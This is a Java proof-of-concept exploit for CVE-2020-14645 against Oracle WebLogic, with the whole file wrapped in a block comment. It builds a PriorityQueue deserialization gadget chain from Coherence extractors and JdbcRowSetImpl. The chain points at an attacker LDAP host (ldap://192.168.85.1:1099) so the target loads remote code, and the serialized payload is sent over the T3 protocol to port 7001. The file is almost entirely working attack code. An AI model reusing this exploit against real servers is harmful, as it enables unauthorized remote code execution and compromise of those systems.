/*
package com.supeream;

import com.sun.rowset.JdbcRowSetImpl;
import com.supeream.serial.Reflections;
import com.supeream.serial.Serializables;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.extractor.UniversalExtractor;
import t3.T3ProtocolOperation;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.PriorityQueue;

public class CVE_2020_14645 {
    public static void main(String[] args) throws Exception {
//        main1();

//        main2();

        main3();

        // T3 send, you can also use python weblogic_t3.py test.ser
//        T3ProtocolOperation.send("172.16.1.130", "7001", payload);

        // test
//        serialize(queueArray);
//        deserialize();

    }

    private static void main1() throws Exception {
        // CVE_2020_14645
        UniversalExtractor extractor = new UniversalExtractor("getDatabaseMetaData()", null, 1);
        final ExtractorComparator comparator = new ExtractorComparator(extractor);

        JdbcRowSetImpl rowSet = new JdbcRowSetImpl();
        rowSet.setDataSourceName("ldap://192.168.85.1:1099/#Calc");
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);

        Object[] q = new Object[]{rowSet, rowSet};
        Reflections.setFieldValue(queue, "queue", q);
        Reflections.setFieldValue(queue, "size", 2);

        // serialize
        byte[] payload = Serializables.serialize(queue);

        serialize(queue);
        T3ProtocolOperation.send("127.0.0.1", 7001, payload);
    }

    public static void main2() throws Exception{

        // 这个是临时Extractor，queue在执行add时候，会触发Extractor，所以需要构造临时
        ReflectionExtractor temp = new ReflectionExtractor("toString", new Object[]{});
        // 这个才是payload
        UniversalExtractor universalExtractor = new UniversalExtractor("getDatabaseMetaData()");
        PriorityQueue queue = new PriorityQueue(2, new ExtractorComparator(temp));
        Object a = JdbcRowSetImpl.class.newInstance();
        Method setDataSourceNameM = a.getClass().getMethod("setDataSourceName", String.class);
        setDataSourceNameM.invoke(a, "ldap://192.168.85.1:1099/#Calc");
        queue.add("1");
        queue.add("1");

        Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = a;
        queueArray[1] = a;
        Field comparatorF = queue.getClass().getDeclaredField("comparator");
        comparatorF.setAccessible(true);
        comparatorF.set(queue, new ExtractorComparator(universalExtractor));

        serialize(queue);
    }

    public static void main3() throws Exception {
        String target = "127.0.0.1";
        int Port = 7001;

        String rmiAddress = "ldap://192.168.85.1:1099/#dozvtq";


        UniversalExtractor universalExtractor = new UniversalExtractor("getDatabaseMetaData()");
        JdbcRowSetImpl jdbcRowSet =  new JdbcRowSetImpl();
        Class clazz1 = JdbcRowSetImpl.class.getSuperclass();
        Field dataSource = clazz1.getDeclaredField("dataSource");
        dataSource.setAccessible(true);
        dataSource.set(jdbcRowSet, rmiAddress);
        ExtractorComparator extractorComparator = new ExtractorComparator(universalExtractor);

        PriorityQueue queue = new PriorityQueue(2);

        queue.add("1");
        queue.add("1");

        Class ext = PriorityQueue.class;
        Field comparator = ext.getDeclaredField("comparator");
        comparator.setAccessible(true);
        comparator.set(queue,extractorComparator);

        Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = jdbcRowSet;

//        serialize(queue);
        byte[] payload = Serializables.serialize(queue);
        T3ProtocolOperation.send("127.0.0.1", 7001, payload);
    }


    public static void serialize(Object obj) {
        try {
            ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("CVE-2020-14645.ser2"));
            os.writeObject(obj);
            os.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void deserialize() {
        try {
            ObjectInputStream is = new ObjectInputStream(new FileInputStream("CVE-2020-14645.ser"));
            is.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

 */